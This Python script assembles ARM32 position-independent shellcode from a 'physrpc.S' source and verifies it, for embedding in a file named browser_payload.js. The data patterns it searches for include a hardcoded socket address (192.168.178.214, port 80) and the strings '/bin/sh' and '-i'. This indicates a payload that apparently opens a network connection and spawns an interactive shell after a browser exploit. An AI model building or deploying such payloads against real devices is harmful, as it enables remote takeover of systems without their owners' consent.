"""Assemble tools/physrpc.S -> tools/physrpc_shellcode.bin (ARM32, position independent).

Two-pass assembly: data labels are referenced as `#OFF_<label>` placeholders.
Pass 1 fills them with 0 to get the layout, pass 2 uses the real offsets.
Instruction sizes do not depend on the immediate, so the layout is stable.

Requires keystone + capstone (pip install keystone-engine capstone).
The resulting blob must then be re-embedded in
server/payloads/browser_payload.js (manual step).
"""
import re
import sys
from pathlib import Path

import capstone
from keystone import KS_ARCH_ARM, KS_MODE_ARM, Ks

HERE = Path(__file__).resolve().parent
SRC = HERE / "physrpc.S"
OUT = HERE / "physrpc_shellcode.bin"

PATTERNS = {
    "tag": b"PHYSRPC1\0",
    "forktag": b"PHYRFORK\0",
    "sa": b"\x02\x00\x00\x50\xc0\xa8\xb2\xd6",
    "path": b"/dev/video40\0",
    "hello": b"PGDB",
    "shpath": b"/bin/sh\0",
    "arg_i": b"-i\0",
}


def assemble(src: str) -> bytes:
    ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
    encoding, _ = ks.asm(src)
    return bytes(encoding)


def main() -> int:
    template = SRC.read_text(encoding="ascii")
    ph = re.compile(r"#OFF_([a-z_]+)")

    # ---- pass 1: zero offsets, find the data by its bytes
    blob0 = assemble(ph.sub("#0", template))
    offs = {}
    for name, pat in PATTERNS.items():
        pos = blob0.find(pat)
        if pos < 0:
            print(f"pass1: pattern for {name} not found")
            return 1
        offs[name] = pos
    # the header block follows arg_i, aligned to 4
    base = (offs["arg_i"] + len(PATTERNS["arg_i"]) + 3) & ~3
    offs["hdr"] = base
    offs["statusbuf"] = base + 16
    offs["argvbuf"] = base + 20
    offs["ts"] = base + 32
    offs["pathbuf"] = base + 40
    offs["databuf"] = base + 296
    offs["cmdbuf"] = base + 4392
    offs["runargv"] = base + 4904
    stack = (offs["runargv"] + 16 + 7) & ~7
    offs["stack_top"] = stack + 0x400
    if offs["stack_top"] != len(blob0):
        print(f"WARNING: computed stack_top 0x{offs['stack_top']:x} != blob len 0x{len(blob0):x}")
    for k in sorted(offs):
        print(f"  {k:10s} 0x{offs[k]:04x}")

    # ---- pass 2: real offsets
    def repl(m):
        name = m.group(1)
        if name not in offs:
            raise KeyError(name)
        return f"#0x{offs[name]:x}"

    blob = assemble(ph.sub(repl, template))
    if len(blob) != len(blob0):
        print(f"ERROR: size changed {len(blob0)} -> {len(blob)}")
        return 1
    OUT.write_bytes(blob)
    print(f"assembled {len(blob)} bytes (0x{len(blob):x}) -> {OUT}")

    # ---- verify every movw<label>/add pair resolves to the right data
    md = capstone.Cs(capstone.CS_ARCH_ARM, capstone.CS_MODE_ARM)
    insns = list(md.disasm(blob, 0))
    checks = 0
    for i, ins in enumerate(insns):
        if ins.mnemonic != "movw":
            continue
        try:
            reg, imm = ins.op_str.split(", ")
            val = int(imm.lstrip("#"), 0)
        except Exception:
            continue
        # expect the next instruction to be `add reg, r12, reg`
        if i + 1 >= len(insns):
            continue
        nxt = insns[i + 1]
        if nxt.mnemonic != "add" or nxt.op_str not in (f"{reg}, r12, {reg}", f"{reg}, ip, {reg}"):
            continue
        tail = blob[val:val + 12]
        print(f"  {reg:>3} = base+0x{val:04x}  {tail!r}")
        checks += 1
    print(f"{checks} data references verified")
    return 0


if __name__ == "__main__":
    sys.exit(main())
